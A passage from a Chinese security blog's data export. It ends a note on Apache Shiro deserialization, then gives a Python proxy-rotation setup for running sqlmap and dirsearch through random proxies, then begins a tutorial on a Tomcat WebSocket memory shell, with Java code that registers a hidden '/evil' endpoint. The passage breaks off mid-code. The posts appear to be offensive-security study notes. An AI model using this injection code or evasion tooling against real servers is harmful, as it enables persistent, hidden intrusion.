src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/2a7236894bc5b1a5940475cd455cc086.png\" alt=\"image-20220228211002005\"></p>\n<p>最后走到 DefaultSerializer.java 中的 <strong>deserialize</strong> 最后 <strong>readObject()</strong> 这里打CC依赖</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/shiro/e1883f1a48ccb600dd647fa9a365c0b9.png\" alt=\"image-20220228211217692\"></p>\n<h1 id=\"细节\"><a href=\"#细节\" class=\"headerlink\" title=\"细节\"></a>细节</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">onSuccessfulLogin -&gt; rememberMeSuccessfulLogin -&gt; onSuccessfulLogin -&gt; </span><br></pre></td></tr></table></figure>\n\n<p>当存在JSESSIONID时，会忽略rememberMe，所以在攻击时需要将JSESSIONID删掉</p>\n<p>Shiro反序列化漏洞目前为止有两个，Shiro-550(Apache Shiro &lt; 1.2.5)和 Shiro-721( Apache Shiro &lt; 1.4.2 )</p>\n<p>主要区别在于</p>\n<ul>\n<li><p><strong>Shiro550使用已知密钥撞</strong></p>\n</li>\n<li><p><strong>Shiro721是使用登录后rememberMe={value}去爆破正确的key值进而反序列化</strong>，</p>\n</li>\n</ul>\n<p>对比Shiro550条件只要有足够密钥库（条件比较低）、Shiro721需要登录（要求比较高鸡肋）</p>\n<ul>\n<li><p>Apache Shiro &lt; 1.4.2默认使用AES/CBC/PKCS5Padding模式</p>\n</li>\n<li><p>Apache Shiro &gt;= 1.4.2默认使用AES/GCM/PKCS5Padding模式</p>\n</li>\n</ul>\n","categories":["Java反序列化"]},{"title":"记一次失败的sqlmap代理池","url":"/2023/12/25/sqlmap%E4%B9%8B%E4%BB%A3%E7%90%86%E6%B1%A0/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>md，弄好了发现免费的代理质量太差了，根本没法达到预期….还是记录下吧。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"代理池\"><a href=\"#代理池\" class=\"headerlink\" title=\"代理池\"></a>代理池</h1><p>使用项目 <a href=\"https://github.com/OxOOo/ProxyPoolWithUI\">OxOOo/ProxyPoolWithUI</a></p>\n<h1 id=\"搭建\"><a href=\"#搭建\" class=\"headerlink\" title=\"搭建\"></a>搭建</h1><p>docker 搭建</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;OxOOo&#x2F;ProxyPoolWithUI.git</span><br><span class=\"line\">cd ProxyPoolWithUI</span><br></pre></td></tr></table></figure>\n\n<p>最好不修改配置文件，修改扫描与验证的时间间隔后会莫名其妙弹窗timeout</p>\n<p>build and run</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker build --tag proxy_pool .</span><br><span class=\"line\">docker run -p 20000:5000 -v &#x2F;home&#x2F;ubuntu&#x2F;pentest&#x2F;proxy&#x2F;ProxyPoolWithUI:&#x2F;proxy -d proxy_pool   # 换路径</span><br></pre></td></tr></table></figure>\n\n<p>成功：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/red-team/image-20220713203816174.png\" alt=\"image-20220713203816174\"></p>\n<p>通过 /fetch_random 返回随机代理</p>\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><p>收集同类型的ip地址到ip.txt</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\">Protocol = <span class=\"string\">&#x27;http&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_proxy</span>():</span></span><br><span class=\"line\">    ips = []</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(ips)!=<span class=\"number\">30</span>:</span><br><span class=\"line\">        proxy = requests.get(<span class=\"string\">&#x27;http://localhost:20000/fetch_random&#x27;</span>).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> Protocol <span class=\"keyword\">in</span> proxy <span class=\"keyword\">and</span> proxy <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> ips:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;[+]get proxy: &#x27;</span>+proxy)</span><br><span class=\"line\">            ips.append(proxy)</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;[*]get proxy finish&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ips</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check</span>(<span class=\"params\">ips</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ips:</span><br><span class=\"line\">        proxies = &#123;<span class=\"string\">&#x27;http&#x27;</span>: i,<span class=\"string\">&#x27;https&#x27;</span>:i&#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = requests.get(<span class=\"string\">&#x27;https://ifconfig.me/ip&#x27;</span>,proxies=proxies,verify=<span class=\"literal\">False</span>,timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> r.text <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">                print(<span class=\"string\">&#x27;[+]check proxy:&#x27;</span>+i)</span><br><span class=\"line\">                <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ip.txt&quot;</span>, <span class=\"string\">&#x27;a&#x27;</span>) <span class=\"keyword\">as</span> file: file.write(i.strip(Protocol+<span class=\"string\">&#x27;://&#x27;</span>) + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;[*]check finish&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    ips = get_proxy()</span><br><span class=\"line\">    check(ips)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/red-team/image-20220714003839352.png\" alt=\"image-20220714003839352\"></p>\n<p>本地进行随机的转发</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> socket <span class=\"keyword\">import</span> error</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">localtime = time.asctime(time.localtime(time.time()))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProxyServerTest</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, proxyip</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># 本地socket服务</span></span><br><span class=\"line\">        self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        self.proxyip = proxyip</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 本地服务IP和端口</span></span><br><span class=\"line\">            self.ser.bind((<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>))</span><br><span class=\"line\">            <span class=\"comment\"># 最大连接数</span></span><br><span class=\"line\">            self.ser.listen(<span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> error <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;[-]The local service : &quot;</span> + <span class=\"built_in\">str</span>(e))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;[-]The local service : &quot;</span> + <span class=\"built_in\">str</span>(e)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 接收客户端数据</span></span><br><span class=\"line\">                client, addr = self.ser.accept()</span><br><span class=\"line\">                print(<span class=\"string\">&#x27;[*]accept %s connect&#x27;</span> % (addr,))</span><br><span class=\"line\">                data = client.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> data:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                print(<span class=\"string\">&#x27;[*]&#x27;</span> + localtime + <span class=\"string\">&#x27;]: Accept data...&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">except</span> error <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                print(<span class=\"string\">&quot;[-]Local receiving client : &quot;</span> + <span class=\"built_in\">str</span>(e))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;[-]Local receiving client : &quot;</span> + <span class=\"built_in\">str</span>(e)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 目标代理服务器，将客户端接收数据转发给代理服务器</span></span><br><span class=\"line\">                mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">                iplen = <span class=\"built_in\">len</span>(self.proxyip)</span><br><span class=\"line\">                proxyip = self.proxyip[random.randint(<span class=\"number\">0</span>, iplen - <span class=\"number\">1</span>)]</span><br><span class=\"line\">                print(<span class=\"string\">&quot;[!]Now proxy ip:&quot;</span> + <span class=\"built_in\">str</span>(proxyip))</span><br><span class=\"line\">                prip = proxyip[<span class=\"number\">0</span>]</span><br><span class=\"line\">                prpo = proxyip[<span class=\"number\">1</span>]</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    mbsocket.settimeout(<span class=\"number\">5</span>)</span><br><span class=\"line\">                    mbsocket.connect((prip, prpo))</span><br><span class=\"line\">                <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                    print(<span class=\"string\">&quot;[-]RE_Connect...&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">#                   except :</span></span><br><span class=\"line\">            <span class=\"comment\">#                       print(&quot;[-]Connect failed,change proxy ip now...&quot;)</span></span><br><span class=\"line\">            <span class=\"comment\">#                      pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                mbsocket.send(data)</span><br><span class=\"line\">                print(<span class=\"string\">&quot;[*]sending data...&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">except</span> error <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                print(<span class=\"string\">&quot;[-]Sent to the proxy server : &quot;</span> + <span class=\"built_in\">str</span>(e))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;[-]Sent to the proxy server : &quot;</span> + <span class=\"built_in\">str</span>(e)</span><br><span class=\"line\">                               </span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    <span class=\"comment\"># 从代理服务器接收数据，然后转发回客户端</span></span><br><span class=\"line\">                    data_1 = mbsocket.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> data_1:</span><br><span class=\"line\">                        <span class=\"keyword\">break</span></span><br><span class=\"line\">                    print(<span class=\"string\">&#x27;[*]&#x27;</span> + localtime + <span class=\"string\">&#x27;]: Send data...&#x27;</span>)</span><br><span class=\"line\">                    client.send(data_1)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> socket.timeout <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(proxyip)</span><br><span class=\"line\">                    print(<span class=\"string\">&quot;[-]Back to the client : &quot;</span> + <span class=\"built_in\">str</span>(e))</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 关闭连接</span></span><br><span class=\"line\"></span><br><span class=\"line\">            client.close()</span><br><span class=\"line\">            mbsocket.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Loadips</span>():</span></span><br><span class=\"line\">    print(<span class=\"string\">&quot;[*]Loading proxy ips..&quot;</span>)</span><br><span class=\"line\">    ip_list = []</span><br><span class=\"line\">    ip = [<span class=\"string\">&#x27;ip&#x27;</span>, <span class=\"string\">&#x27;port&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ips.txt&quot;</span>) <span class=\"keyword\">as</span> ips:</span><br><span class=\"line\">        lines = ips.readlines()</span><br><span class=\"line\">                               </span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">        ip[<span class=\"number\">0</span>], ip[<span class=\"number\">1</span>] = line.strip().split(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">        ip[<span class=\"number\">1</span>] = <span class=\"built_in\">eval</span>(ip[<span class=\"number\">1</span>])</span><br><span class=\"line\">        nip = <span class=\"built_in\">tuple</span>(ip)</span><br><span class=\"line\">        ip_list.append(nip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ip_list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;[+]START&#x27;</span>)</span><br><span class=\"line\">    ip_list = Loadips()</span><br><span class=\"line\">    <span class=\"comment\">#   ip_list = [(&#x27;118.89.148.92&#x27;,8088)]</span></span><br><span class=\"line\">    <span class=\"comment\">#   ip_list = tuple(ip_list)</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        pst = ProxyServerTest(ip_list)</span><br><span class=\"line\">        <span class=\"comment\"># 多线程</span></span><br><span class=\"line\">        t = threading.Thread(target=pst.run, name=<span class=\"string\">&#x27;LoopThread&#x27;</span>)</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;[*]Waiting for connection...&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 关闭多线程</span></span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(<span class=\"string\">&quot;[-]main : &quot;</span> + <span class=\"built_in\">str</span>(e))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;[-]main : &quot;</span> + <span class=\"built_in\">str</span>(e)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>sqlmap加上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">--proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:9999</span><br></pre></td></tr></table></figure>\n\n<p>dirsearch加上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">--proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:9999</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/red-team/image-20220714004359606.png\" alt=\"image-20220714004359606\"></p>\n","categories":["Red-Team"]},{"title":"websocket内存马","url":"/2023/12/25/websocket/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2F6193d09c503d8e057afa1636_Java%20code%20review%20checklist-min-p-1600.jpeg\" alt=\"6193d09c503d8e057afa1636_Java code review checklist-min-p-1600\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>看到新型内存马项目，学习一下，项目地址：<a href=\"https://github.com/veo/wsMemShell\">https://github.com/veo/wsMemShell</a></p>\n<p>websocket类型内存马的学习，环境：Tomcat 8.5 + JDK1.8</p>\n<h1 id=\"websocket\"><a href=\"#websocket\" class=\"headerlink\" title=\"websocket\"></a>websocket</h1><p>先读这一篇前置知识文章：<a href=\"https://blog.csdn.net/weixin_36586120/article/details/120025498\">WebSocket通信原理和在Tomcat中实现源码详解</a></p>\n<p>Tomcat7早期版本7.0.47之前还没有出 JSR356标准时，自己实现了一套接口，支持websocket。后来Tomcat7.0.47版本废弃自定义的API，实现了JSR356标准。</p>\n<p>根据JSR356规定， 建立WebSocket连接的服务器端和客户端，两端对称，抽象成API，就是一个个<strong>Endpoint</strong>（端点），只不过服务器端的叫 <strong>ServerEndpoint</strong>，客户端的叫 <strong>ClientEndpoint</strong>。客户端向服务端发送WebSocket握手请求，建立连接后就创建一个<strong>ServerEndpoint对象</strong>。</p>\n<h1 id=\"websocket基于Tomcat实现\"><a href=\"#websocket基于Tomcat实现\" class=\"headerlink\" title=\"websocket基于Tomcat实现\"></a>websocket基于Tomcat实现</h1><p>tomcat中存在两种方式：一、ServerEndpoint注解方式。二、继承抽象类Endpoint方式。这里利用注解方式来进行实现</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.server.ServerEndpoint;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@ServerEndpoint(value = &quot;/websocket&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">WebSocket</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Session session;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@OnOpen</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">start</span><span class=\"params\">(Session session)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.session = session;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.session.getAsyncRemote().sendText(<span class=\"string\">&quot;websocket strt&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@OnClose</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">end</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;websocket close&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@OnMessage</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">incoming</span><span class=\"params\">(String message)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.session.getAsyncRemote().sendText(<span class=\"string\">&quot;websocket recievd: &quot;</span>+message);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@OnError</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onError</span><span class=\"params\">(Throwable t)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;websocket error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>关于继承抽象类Endpoint的方式，需要自己实现 <strong>MessageHandler</strong> 和 <strong>ServerApplicationConfig</strong></p>\n<p>MessageHandler 用于处理消息，ServerApplicationConfig用于处理URI映射。</p>\n<h1 id=\"websocket加载\"><a href=\"#websocket加载\" class=\"headerlink\" title=\"websocket加载\"></a>websocket加载</h1><p>Tomcat通过 <strong>org.apache.tomcat.websocket.server.WsSci</strong> 专门对 websocket 进行初始化以及加载，该类实现了接口 <strong>javax.servlet.ServletContainerInitializer</strong> </p>\n<p>该接口是Servlet 3.0规范中定义的用来接收Web应用启动事件的接口，简称为SCI加载机制。</p>\n<p>该机制在Tomcat部署装载Web项目 <strong>org.apache.catalina.core.StandardContext#startInternal</strong> 时主动触发 <strong>ServletContainerInitializer#onStartup</strong>，做一些扩展的初始化操作。</p>\n<h2 id=\"WsSci-onStartup\"><a href=\"#WsSci-onStartup\" class=\"headerlink\" title=\"WsSci#onStartup\"></a>WsSci#onStartup</h2><p>WsSci会将 <strong>HandlesTypes注解</strong>指定的类扫描出来，并 <strong>创建WebSocketContainer容器</strong>，将扫描的类添加到容器中。扫描的类如下</p>\n<ul>\n<li>注解类ServerEndpoint即 @ServerEndpoint</li>\n<li>ServerApplicationConfig实现类</li>\n<li>Endpoint子类</li>\n</ul>\n<p>调试一下，扫描到刚才自定义的 ServerEndpoint，创建WebSocketContainer容器，这里用的是 <strong>WsServerContainer</strong> 类</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220720232039952.png\" alt=\"image-20220720232039952\"></p>\n<p>在 WsServerContainer 的构造函数中为ServletContext添加了一个 <strong>org.apache.tomcat.websocket.server.WsFilter</strong> 类型的Filter用来 <strong>处理websocket的请求</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220720234850629.png\" alt=\"image-20220720234850629\"></p>\n<p>回到SCI中，定义三个set集合针对扫描到的三种不同类</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220720232801875.png\" alt=\"image-20220720232801875\"></p>\n<p>三个if对不同类型进行添加</p>\n<ul>\n<li>当前类为ServerApplicationConfig 添加到 <strong>serverApplicationConfigs</strong> 集合中</li>\n<li>当前为Endpoint的子类 添加到 <strong>scannedEndpointClazzes</strong> 集合中</li>\n<li>当前类为ServerEndpoint 添加到 <strong>scannedPojoEndpoints</strong> 集合中</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220720235931159.png\" alt=\"image-20220720235931159\"></p>\n<p>又重新定义了 两个集合<strong>filteredEndpointConfigs</strong> 和<strong>filteredPojoEndpoints</strong>，如果 <strong>serverApplicationConfigs</strong> 为空即不存在以继承抽象类Endpoint的方式编写的类，将注释方式的类添加 <strong>filteredPojoEndpoints</strong> 中，else中不在赘述。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220721001100660.png\" alt=\"image-20220721001100660\"></p>\n<p>通过 <strong>addEndpoint</strong> 添加到WebSocketContainer容器中，两种websocket实现方式调用的addEndpoint也不相同</p>\n<ul>\n<li>Endpoint 子类调用的是形参为 (ServerEndpointConfig)</li>\n<li>ServerEndpoint 类调用的形参为 (Class&lt;?&gt; pojo, boolean fromAnnotatedPojo)</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220721002347745.png\" alt=\"image-20220721002347745\"></p>\n<h2 id=\"WsServerContainer-addEndpoint\"><a href=\"#WsServerContainer-addEndpoint\" class=\"headerlink\" title=\"WsServerContainer#addEndpoint\"></a>WsServerContainer#addEndpoint</h2><p>定义 ServerEndpointConfig 变量，然后获取 ServerEndpoint 的路径</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220721004610184.png\" alt=\"image-20220721004610184\"></p>\n<p>最后调用一堆方法去构造出 <strong>ServerEndpointConfig 对象</strong>。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220721004816947.png\" alt=\"image-20220721004816947\"></p>\n<p>再次调用addEndpoint，传入ServerEndpointConfig 等配置对象，这里很明显能看出通过 <strong>PojoMethodMapping</strong> 类去解析配置信息，获取OnClose、OnOpen等方法，添加到 ServerEndpointConfig 对象中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220721203956691.png\" alt=\"image-20220721203956691\"></p>\n<p>接下来通过<strong>UriTemplate</strong>去处理映射的路由路径，对path进行是否重复的检查，把path和其ServerEndpointConfig对象添加到 <strong>configExactMatchMap</strong> 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220721232910575.png\" alt=\"image-20220721232910575\"></p>\n<p>至此完成添加一个ServerEndpoint。</p>\n<h1 id=\"websocket通信\"><a href=\"#websocket通信\" class=\"headerlink\" title=\"websocket通信\"></a>websocket通信</h1><p>关于WsFilter，当服务器接收到来自客户端的请求时，首先WsFilter会判断该请求是否是一个WebSocket Upgrade请求（即包含Upgrade: websocket头信息）。如果是，则根据请求路径查找对应的Endpoint处理类。只需要知道WsFilter用来处理websocket请求，对应的EndPoint进行处理即可。</p>\n<h1 id=\"websocket注入实现\"><a href=\"#websocket注入实现\" class=\"headerlink\" title=\"websocket注入实现\"></a>websocket注入实现</h1><p>实现思路类比其他类型内存马</p>\n<ul>\n<li>获取StandardContext</li>\n<li>获取WebSocketContainer</li>\n<li>创建恶意的ServerEndpointConfig</li>\n<li>调用addEndpoint()</li>\n</ul>\n<p>websocket.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.catalina.core.StandardContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.tomcat.websocket.server.WsServerContainer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.server.ServerContainer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">wssocket</span> <span class=\"keyword\">extends</span> <span class=\"title\">Endpoint</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span>&#123;</span><br><span class=\"line\">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class=\"line\">        ServerEndpointConfig build = ServerEndpointConfig.Builder.create(wssocket.class, <span class=\"string\">&quot;/evil&quot;</span>).build();</span><br><span class=\"line\">        WsServerContainer attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            attribute.addEndpoint(build);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (DeploymentException e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Session session;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onOpen</span><span class=\"params\">(Session session, EndpointConfig config)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.session = session;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.session.addMessageHandler(<span class=\"keyword\">new</span> MessageHandler());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MessageHandler</span> <span class=\"keyword\">implements</span> <span class=\"title\">javax</span>.<span class=\"title\">websocket</span>.<span class=\"title\">MessageHandler</span>.<span class=\"title\">Whole</span>&lt;<span 